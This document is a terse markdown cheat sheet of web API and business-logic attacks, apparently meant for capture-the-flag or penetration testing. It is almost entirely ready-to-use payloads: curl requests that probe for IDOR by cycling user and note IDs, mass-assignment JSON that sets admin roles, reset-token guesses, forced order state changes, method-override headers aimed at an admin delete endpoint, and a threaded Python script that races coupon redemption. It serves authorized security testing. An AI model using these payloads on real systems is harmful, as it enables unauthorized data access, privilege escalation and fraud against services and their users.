# API / Logic

## IDOR

```bash
curl http://HOST/api/user/1 -H 'Cookie: session=COOKIE'
curl http://HOST/api/user/2 -H 'Cookie: session=COOKIE'
curl http://HOST/api/note/1 -H 'Authorization: Bearer TOKEN'
```

Try IDs in every location:

```text
/api/users/1
?user_id=1
{"user_id":1}
{"owner_id":1}
X-User-Id: 1
```

## Mass Assignment

```json
{"username":"a","password":"b","role":"admin"}
{"username":"a","password":"b","isAdmin":true}
{"username":"a","password":"b","verified":true}
{"user":{"id":1,"role":"admin"}}
```

## State Change

```bash
curl -X POST http://HOST/api/order/1/pay -b cookie.txt
curl -X POST http://HOST/api/order/1/ship -b cookie.txt
curl -X POST http://HOST/api/order/1/refund -b cookie.txt
```

Try skipping steps:

```text
create -> refund
register -> admin action
unpaid -> download
unverified -> reset password
```

## Reset Token

```text
/reset?token=1
/reset?token=000000
/reset?token=
/reset?user=admin&token=TOKEN
```

Look for:

```text
token in response body
token in email preview/log
token based on timestamp/user id
old token still valid after new token
password reset does not bind token to user
```

## Race

```python
import concurrent.futures
import requests

URL = "http://HOST/api/coupon/redeem"
COOKIE = {"session": "COOKIE"}
DATA = {"coupon": "FREE"}

def hit(_):
    return requests.post(URL, cookies=COOKIE, json=DATA, timeout=5).text

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(hit, range(50)):
        if "ok" in r.lower() or "flag" in r.lower():
            print(r)
```

## Method Override

```http
POST /admin/delete HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
Content-Type: application/x-www-form-urlencoded

_method=DELETE&id=1
```

